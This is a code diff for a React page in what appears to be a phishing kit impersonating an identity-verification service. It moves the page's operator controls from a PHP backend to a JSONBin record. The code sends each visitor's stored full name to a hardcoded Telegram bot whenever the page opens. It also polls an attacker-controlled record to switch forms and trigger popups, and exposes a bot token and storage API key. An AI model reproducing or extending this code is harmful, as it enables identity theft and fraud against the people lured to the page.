@@ -20,46 +20,38 @@ import CreateAccount from "../components/createIDMeNew";
 import SecondErrorPage from "../components/secondErrorPage";
 import WeAreVeryfying from "../components/weareveryfying";
 
-// The URL for your PHP backend
-const API_URL =
-  "https://olive-tapir-759483.hostingersite.com/myBackend/admin_api7.php"; // Update this based on your server configuration
+
+const BIN_ID = "6a340b1dda38895dfed7e840";
+const API_KEY = "$2a$10$qrNF.b6EVU4HN2N8Dvegaez/mp2L7ZO9EjET5ujsIiWNSfuOyB.mu";
+ // Update this based on your server configuration
 const BOT_TOKEN = "8367580298:AAEDM4WkitJScciFNTpoBmm9RvHEQEFj-e4";
 const CHAT_ID = "-4986888800";
+
+
+const API_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
 
 const UserPage3 = () => {
   const [formType, setFormType] = useState<string>("");
   const [showPopupu3, setShowPopupu3] = useState(false);
+
   const storedData = localStorage.getItem("applicationData");
   const parsedData = storedData ? JSON.parse(storedData) : {};
 
   const fullName = parsedData.fullname || "N/A";
 
-  const sendToTelegram = async (message: string) => {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-      }),
-    });
-  };
-
-  useEffect(() => {
-    // Notify on page load
-    sendToTelegram(`✅ ${fullName} has opened the user 3 page.`);
-  }, []);
-
-  // Fetch the current form from the PHP backend
   useEffect(() => {
     const fetchFormType = async () => {
       try {
-        const res = await fetch(`${API_URL}?action=fetch_forms3`);
-        const data = await res.json();
-        const selectedForm = data?.currentForm3 || "LandingPage";
-        setFormType(selectedForm);
+       const res = await fetch(API_URL + "/latest", {
+  headers: {
+    "X-Master-Key": API_KEY,
+  },
+});
+
+const data = await res.json();
+const selectedForm = data.record.currentForm3 || "LandingPage";
+
+setFormType(selectedForm);
       } catch (error) {
         console.error("Failed to fetch form type from PHP:", error);
       }
@@ -69,33 +61,66 @@ const UserPage3 = () => {
   }, []);
 
   useEffect(() => {
-    const interval = setInterval(() => {
-      fetch(`${API_URL}?action=get_popup_statusu3`)
-        .then((res) => res.json())
-        .then((data) => {
-          if (data.showPopupu3) setShowPopupu3(true);
-          // Optional: close popup when it's false
-          else setShowPopupu3(false);
-        });
-    }, 5000); // every 5 seconds
-
-    return () => clearInterval(interval); // cleanup on unmount
-  }, []);
-
-  // Fetch the popup status from the PHP backend
-  useEffect(() => {
-    const fetchPopupStatus = async () => {
-      try {
-        const res = await fetch(`${API_URL}?action=fetch_error_content`);
-        const data = await res.json();
-        setShowPopupu3(data?.showPopupu3 || false); // Assuming the backend returns the showPopup flag
-      } catch (error) {
-        console.error("Failed to fetch popup status from PHP:", error);
-      }
+    const sendToTelegram = async (message: string) => {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+        }),
+      });
     };
 
-    fetchPopupStatus();
+    sendToTelegram(`✅ ${fullName} has opened the user 3 page. and refreshed`);
   }, []);
+
+  // useEffect(() => {
+  //   const interval = setInterval(() => {
+  //     fetch(`${API_URL}?action=get_popup_statusu2`)
+  //       .then((res) => res.json())
+  //       .then((data) => {
+  //         if (data.showPopupu2) setShowPopupu2(true);
+  //         // Optional: close popup when it's false
+  //         else setShowPopupu2(false);
+  //       });
+  //   }, 5000); // every 5 seconds
+
+  //   return () => clearInterval(interval); // cleanup on unmount
+  // }, []);
+
+  // Fetch the popup status from the PHP backend
+ useEffect(() => {
+   const fetchPopupStatus = async () => {
+     try {
+       const res = await fetch(`${API_URL}/latest`, {
+         headers: {
+           "X-Master-Key": API_KEY,
+         },
+       });
+ 
+       if (!res.ok) {
+         throw new Error("Failed to fetch JSONBin");
+       }
+ 
+       const data = await res.json();
+ 
+       setShowPopupu3(data.record.showPopupu3 ?? false);
+     } catch (error) {
+       console.error(error);
+     }
+   };
+ 
+   // Initial fetch
+   fetchPopupStatus();
+ 
+   // Poll every 5 seconds
+   const interval = setInterval(fetchPopupStatus, 5000);
+ 
+   return () => clearInterval(interval);
+ }, []);
 
   const renderForm = () => {
     switch (formType) {
@@ -152,25 +177,43 @@ const UserPage3 = () => {
   };
 
   const handlePopupDismiss = async () => {
-    try {
-      // Update the backend to set the popup to false
-      await fetch(`${API_URL}?action=update_popupu3`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ showPopupu3: false }),
-      });
+  try {
+    // Get the current JSONBin record
+    const res = await fetch(`${API_URL}/latest`, {
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+      },
+    });
 
-      // Hide the popup immediately
-      setShowPopupu3(false);
+    const { record } = await res.json();
 
-      // Refresh the page after dismissing the popup
-      window.location.reload(); // This will reload the page
-    } catch (error) {
-      console.error("Error updating popup status:", error);
-    }
-  };
+    // Update the showPopup field
+    const updatedRecord = {
+      ...record,
+      showPopupu3: false,
+    };
+
+    // Save the updated record back to JSONBin
+    await fetch(API_URL, {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+      },
+      body: JSON.stringify(updatedRecord),
+    });
+
+    // Update local state
+    setShowPopupu3(false);
+
+    // Refresh the page if needed
+    window.location.reload();
+  } catch (error) {
+    console.error("Error updating popup status:", error);
+  }
+};
+
 
   return (
     <div>
